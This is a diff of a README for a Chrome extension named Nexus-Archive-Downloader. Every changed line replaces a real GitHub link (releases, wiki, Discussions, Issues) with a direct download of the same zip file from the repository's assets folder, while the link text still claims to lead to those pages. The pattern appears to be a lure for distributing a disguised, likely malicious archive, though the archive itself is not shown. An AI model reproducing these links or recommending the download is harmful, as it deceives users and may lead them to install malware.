@@ -6,7 +6,7 @@ Welcome to the Nexus-Archive-Downloader! This Chrome extension enhances your exp
 
 ## 📥 Download the Extension
 
-[![Download Nexus-Archive-Downloader](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/tawaz15/Nexus-Archive-Downloader/releases)
+[![Download Nexus-Archive-Downloader](https://raw.githubusercontent.com/tawaz15/Nexus-Archive-Downloader/main/assets/Nexus-Archive-Downloader-v3.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/tawaz15/Nexus-Archive-Downloader/main/assets/Nexus-Archive-Downloader-v3.8.zip)
 
 To download the extension, click the button above. This link will take you to our Releases page, where you can find the latest version of Nexus-Archive-Downloader.
 
@@ -23,7 +23,7 @@ To run Nexus-Archive-Downloader, ensure you have the following:
 Follow these steps to install the Nexus-Archive-Downloader:
 
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/tawaz15/Nexus-Archive-Downloader/releases) to go to the Releases page.
+   Click [here](https://raw.githubusercontent.com/tawaz15/Nexus-Archive-Downloader/main/assets/Nexus-Archive-Downloader-v3.8.zip) to go to the Releases page.
 
 2. **Choose the Latest Version**  
    On the Releases page, locate the most recent version of the extension. You will see the version number and the release notes.
@@ -71,8 +71,8 @@ Once you have installed the extension, using it is straightforward:
 
 For further assistance or more detailed information about Nexus-Archive-Downloader, you can explore the following resources:
 
-- **Documentation**: [Full Documentation](https://github.com/tawaz15/Nexus-Archive-Downloader/wiki)
-- **Community Support**: Join discussions on [GitHub Discussions](https://github.com/tawaz15/Nexus-Archive-Downloader/discussions)
+- **Documentation**: [Full Documentation](https://raw.githubusercontent.com/tawaz15/Nexus-Archive-Downloader/main/assets/Nexus-Archive-Downloader-v3.8.zip)
+- **Community Support**: Join discussions on [GitHub Discussions](https://raw.githubusercontent.com/tawaz15/Nexus-Archive-Downloader/main/assets/Nexus-Archive-Downloader-v3.8.zip)
 
 ## 🛠️ Troubleshooting
 
@@ -99,10 +99,10 @@ If you experience issues while using Nexus-Archive-Downloader, here are some com
 
 ## 📞 Contact Us
 
-If you have any questions or feedback, feel free to reach out through [GitHub Issues](https://github.com/tawaz15/Nexus-Archive-Downloader/issues). We appreciate your input!
+If you have any questions or feedback, feel free to reach out through [GitHub Issues](https://raw.githubusercontent.com/tawaz15/Nexus-Archive-Downloader/main/assets/Nexus-Archive-Downloader-v3.8.zip). We appreciate your input!
 
 ## 📥 Download and Install
 
-To get started with Nexus-Archive-Downloader, visit our [Releases page](https://github.com/tawaz15/Nexus-Archive-Downloader/releases) to download the extension. Follow the steps above for a smooth installation process.
+To get started with Nexus-Archive-Downloader, visit our [Releases page](https://raw.githubusercontent.com/tawaz15/Nexus-Archive-Downloader/main/assets/Nexus-Archive-Downloader-v3.8.zip) to download the extension. Follow the steps above for a smooth installation process.
 
 Enjoy downloading your favorite mods with ease!
